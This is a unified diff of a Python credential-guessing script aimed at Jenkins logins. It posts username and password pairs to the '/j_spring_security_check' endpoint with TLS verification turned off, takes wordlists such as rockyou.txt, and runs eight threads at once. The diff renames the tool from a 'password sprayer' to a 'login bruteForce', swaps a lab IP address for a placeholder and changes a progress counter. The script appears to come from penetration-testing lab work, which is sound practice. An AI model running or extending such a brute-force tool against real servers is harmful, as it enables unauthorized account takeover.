@@ -8,7 +8,6 @@ import concurrent.futures
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-
 # UTILS ########################################################################
 def try_login(auth):
     r = SESSION.post(URL + '/j_spring_security_check', data=auth, verify=False)
@@ -41,12 +40,12 @@ def spray(user, password=None):
         password_count += 1
         if password_count == order:
             print('So far I\'ve tried [ {} ] passwords for user [ {} ]'.format(order, user))
-            order *= 10
+            order += 100
 
 
 # MAIN #########################################################################
-example_text = "Example: python3 jenkins_password_spraying.py -u admin -P /usr/share/wordlists/rockyou.txt http://10.129.134.107:8080"
-parser = argparse.ArgumentParser(description = 'Jenkins password sprayer', epilog=example_text)
+example_text = "Example: python3 jenkinsLoginBrute.py -u admin -P /usr/share/wordlists/rockyou.txt http://{host ip}:{port}"
+parser = argparse.ArgumentParser(description = 'Jenkins login bruteForce', epilog=example_text)
 parser.add_argument('url', nargs='+', type=str)
 parser.add_argument('-u', '--user', type=str)
 parser.add_argument('-U', '--user_file', type=str)
@@ -85,4 +84,3 @@ if passwords == [] or users == []:
 
 with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
     executor.map(spray, users)
-
